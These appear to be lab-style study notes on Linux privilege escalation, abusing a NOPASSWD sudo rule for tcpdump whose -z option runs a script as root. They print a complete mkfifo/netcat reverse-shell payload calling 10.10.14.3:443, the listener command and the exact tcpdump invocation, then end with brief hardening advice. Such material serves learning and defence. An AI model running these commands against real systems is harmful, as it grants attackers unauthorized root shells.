# Sudo Rights Abuse Notes

## What is sudo?

`sudo` allows a user to run commands as another user (usually root) without switching accounts.

System checks permissions from:

```bash
/etc/sudoers
```

---

# Enumerating sudo Rights

## Command

```bash
sudo -l
```

## Purpose

Lists commands the current user can run with sudo.

## Example Output

```bash
User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

## Meaning

|Part|Meaning|
|---|---|
|`(root)`|Command runs as root|
|`NOPASSWD`|No password required|
|`/usr/sbin/tcpdump`|Allowed command|

---

# Why This is Dangerous

If privileged binaries support command execution features, attackers can abuse them for privilege escalation.

Here:

```bash
tcpdump
```

has a dangerous option:

```bash
-z postrotate-command
```

---

# Understanding tcpdump Abuse

## Manual Check

```bash
man tcpdump
```

Important section:

```bash
-z postrotate-command
```

### Meaning

After rotating capture files, tcpdump executes another command/script.

If tcpdump runs as root:

- script also runs as root
    

---

# Exploit Flow

## Step 1 — Create Malicious Script

## View Script

```bash
cat /tmp/.test
```

## Payload

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

---

# Reverse Shell Payload Breakdown

## Remove Old FIFO

```bash
rm /tmp/f
```

Deletes old named pipe if exists.

---

## Create FIFO File

```bash
mkfifo /tmp/f
```

Creates named pipe (FIFO).

FIFO = special file used for communication between processes.

---

## Read From FIFO

```bash
cat /tmp/f
```

Reads input from pipe.

---

## Pipe into Shell

```bash
/bin/sh -i
```

Starts interactive shell.

---

## Redirect Errors

```bash
2>&1
```

Sends stderr to stdout.

---

## Send Shell to Attacker

```bash
nc 10.10.14.3 443
```

Connects to attacker listener.

---

## Redirect Back to FIFO

```bash
>/tmp/f
```

Creates interactive communication channel.

---

# Step 2 — Start Listener on Attacker Machine

```bash
nc -lnvp 443
```

|Option|Meaning|
|---|---|
|`-l`|Listen mode|
|`-n`|No DNS resolution|
|`-v`|Verbose|
|`-p 443`|Listen on port 443|

---

# Step 3 — Execute tcpdump Exploit

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

---

# Command Breakdown

|Part|Meaning|
|---|---|
|`sudo`|Run as root|
|`/usr/sbin/tcpdump`|Packet capture tool|
|`-l`|Line buffered output|
|`-n`|No hostname resolution|
|`-i ens192`|Use interface ens192|
|`-w /dev/null`|Discard capture file|
|`-W 1`|Keep 1 rotated file|
|`-G 1`|Rotate every 1 second|
|`-z /tmp/.test`|Execute script after rotation|
|`-Z root`|Run command as root|

# What Happens Internally

## tcpdump Executes

```bash
/tmp/.test
```

as:

```bash
root
```

## Result

Reverse shell connects back to attacker.

# Important Notes

## AppArmor Protection

Modern Linux distributions may block:

```bash
-z postrotate-command
```

to prevent command execution.

---

# Security Best Practices

## 1. Use Absolute Paths

Good:

```bash
/bin/cat
```

Bad:

```bash
cat
```

Prevents PATH abuse.

---

## 2. Principle of Least Privilege

Only allow minimal required sudo commands.

Avoid:

```bash
(ALL) ALL
```

Prefer limited permissions.
